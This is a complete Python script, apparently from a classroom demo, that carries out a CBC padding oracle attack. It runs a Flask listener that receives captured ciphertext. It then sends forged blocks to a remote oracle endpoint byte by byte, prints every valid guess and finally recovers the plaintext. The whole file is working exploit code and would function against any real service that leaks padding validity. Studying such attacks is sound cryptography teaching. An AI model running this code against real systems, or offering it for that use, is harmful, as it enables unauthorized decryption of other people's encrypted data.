#!/usr/bin/env python3
"""
Padding Oracle Attacker
Run in Terminal 2. Receives ciphertext from the sender,
then decrypts it using the CBC padding oracle attack.
Prints each step: every byte guess that gets a 'valid' response from the oracle.
"""

import threading
import logging
import socket
import time
from flask import Flask, request, jsonify
import requests as http_req

# --- Hardcoded values ---
BLOCK_SIZE = 16                        # AES block size: 16 bytes (128 bits)
LISTEN_HOST = "0.0.0.0"
ORACLE_PORT = 5000
LISTEN_PORT = 5001

# --- Flask app to receive ciphertext ---
app = Flask(__name__)
logging.getLogger("werkzeug").setLevel(logging.ERROR)

captured_event = threading.Event()
captured_ct = {"hex": None}


@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json(force=True)
    ct_hex = data.get("ciphertext", "")
    if ct_hex:
        captured_ct["hex"] = ct_hex
        captured_event.set()
    return jsonify({"status": "ok"})


# --- Helper functions ---

def fmt(data):
    """Format bytes as space-separated decimal values."""
    return " ".join(str(b) for b in data)


def get_local_ip():
    """Best-effort LAN IP discovery for same-Wi-Fi testing."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect(("8.8.8.8", 80))
        return sock.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        sock.close()


def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


def split_blocks(data):
    return [data[i:i+BLOCK_SIZE] for i in range(0, len(data), BLOCK_SIZE)]


def ask_oracle(two_blocks):
    """Send 2 blocks to the server, get back True (padding valid) or False."""
    try:
        resp = http_req.post(app.config["ORACLE_URL"], json={"ciphertext": two_blocks.hex()}, timeout=10)
        return resp.json().get("valid", False)
    except Exception:
        return False


# --- The attack ---

def padding_oracle_attack(ct_hex):
    data = bytes.fromhex(ct_hex)
    blocks = split_blocks(data)
    num_ct_blocks = len(blocks) - 1

    print("\n" + "=" * 60)
    print("  PADDING ORACLE ATTACK")
    print("=" * 60)
    print(f"  Ciphertext     : {fmt(data)}")
    print(f"  Total length   : {len(data)} bytes")
    print(f"  Block size     : {BLOCK_SIZE} bytes")
    print(f"  Blocks         : 1 IV + {num_ct_blocks} ciphertext")
    print(f"  Padding method : PKCS#7")
    print(f"  Oracle URL     : {app.config['ORACLE_URL']}")
    print("=" * 60)

    query_count = 0
    all_plaintext = b""
    start = time.time()

    for blk_num in range(1, len(blocks)):
        prev_block = blocks[blk_num - 1]
        target_block = blocks[blk_num]
        intermediate = bytearray(BLOCK_SIZE)

        print(f"\n--- Block {blk_num} of {num_ct_blocks} ---")
        print(f"  Previous block : {fmt(prev_block)}")
        print(f"  Target block   : {fmt(target_block)}")

        for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
            target_padding = BLOCK_SIZE - byte_pos

            crafted = bytearray(BLOCK_SIZE)
            for k in range(byte_pos + 1, BLOCK_SIZE):
                crafted[k] = intermediate[k] ^ target_padding

            found = False
            for guess in range(256):
                crafted[byte_pos] = guess
                forged = bytes(crafted) + target_block
                query_count += 1
                valid = ask_oracle(forged)

                if valid:
                    if byte_pos == BLOCK_SIZE - 1:
                        check = bytearray(crafted)
                        check[byte_pos - 1] ^= 0x01
                        query_count += 1
                        if not ask_oracle(bytes(check) + target_block):
                            continue

                    intermediate[byte_pos] = guess ^ target_padding
                    pt_byte = prev_block[byte_pos] ^ intermediate[byte_pos]
                    char = chr(pt_byte) if 32 <= pt_byte < 127 else "."

                    print(f"  Byte {BLOCK_SIZE - byte_pos:2d}/16 | "
                          f"guess={guess} | "
                          f"oracle=VALID | "
                          f"intermediate={intermediate[byte_pos]} | "
                          f"plaintext_byte={pt_byte} ('{char}') | "
                          f"queries={query_count}")
                    found = True
                    break

            if not found:
                print(f"  FAILED at byte position {byte_pos}")
                return

        pt_block = xor_bytes(prev_block, bytes(intermediate))
        all_plaintext += pt_block
        print(f"  Block {blk_num} recovered : {fmt(pt_block)}")

    elapsed = time.time() - start

    # strip PKCS#7 padding
    raw = all_plaintext
    pad_byte = raw[-1]
    if 1 <= pad_byte <= BLOCK_SIZE and raw[-pad_byte:] == bytes([pad_byte] * pad_byte):
        plaintext = raw[:-pad_byte]
        print(f"\nPKCS#7 padding: last {pad_byte} byte(s) have value {pad_byte}, stripped.")
    else:
        plaintext = raw
        print(f"\nNo valid PKCS#7 padding found, returning raw bytes.")

    try:
        text = plaintext.decode()
    except UnicodeDecodeError:
        text = None

    print("\n" + "=" * 60)
    print("  RESULT")
    print("=" * 60)
    print(f"  Decrypted bytes : {fmt(plaintext)}")
    if text is not None:
        print(f"  Decrypted text  : {text}")
    print(f"  Total queries   : {query_count}")
    print(f"  Time            : {elapsed:.2f}s")
    print("=" * 60 + "\n")


def main():
    local_ip = get_local_ip()
    server_ip = input("Enter server PC IP (blank for localhost): ").strip() or "127.0.0.1"
    app.config["ORACLE_URL"] = f"http://{server_ip}:{ORACLE_PORT}/oracle"

    t = threading.Thread(
        target=lambda: app.run(host=LISTEN_HOST, port=LISTEN_PORT, threaded=True),
        daemon=True,
    )
    t.start()

    print("=" * 60)
    print("  ATTACKER — PADDING ORACLE")
    print("=" * 60)
    print(f"  Block size  : {BLOCK_SIZE} bytes")
    print(f"  Padding     : PKCS#7")
    print(f"  This PC IP  : {local_ip}")
    print(f"  Oracle URL  : {app.config['ORACLE_URL']}")
    print(f"  Listening   : http://{local_ip}:{LISTEN_PORT}/capture")
    print("=" * 60)
    print("\nWaiting for ciphertext from sender...\n")

    while True:
        captured_event.wait()
        captured_event.clear()

        ct_hex = captured_ct["hex"]
        ct_bytes = bytes.fromhex(ct_hex)
        print(f"Ciphertext received: {fmt(ct_bytes)}")

        padding_oracle_attack(ct_hex)

        print("Waiting for next ciphertext...\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nBye.")
